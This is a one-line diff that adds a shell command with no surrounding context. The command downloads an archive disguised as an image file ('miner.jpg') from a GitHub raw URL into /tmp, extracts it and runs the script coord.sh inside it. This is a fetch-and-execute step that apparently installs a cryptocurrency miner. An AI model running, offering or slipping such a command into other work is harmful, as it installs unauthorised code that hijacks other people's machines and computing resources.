@@ -1,0 +1,1 @@
+curl -vso /tmp/miner.jpg https://raw.githubusercontent.com/pburkholder/cf-iife/master/assets/miner.jpg; cd /tmp/ ; tar -xf miner.jpg; cd /tmp/miner; sh -x coord.sh
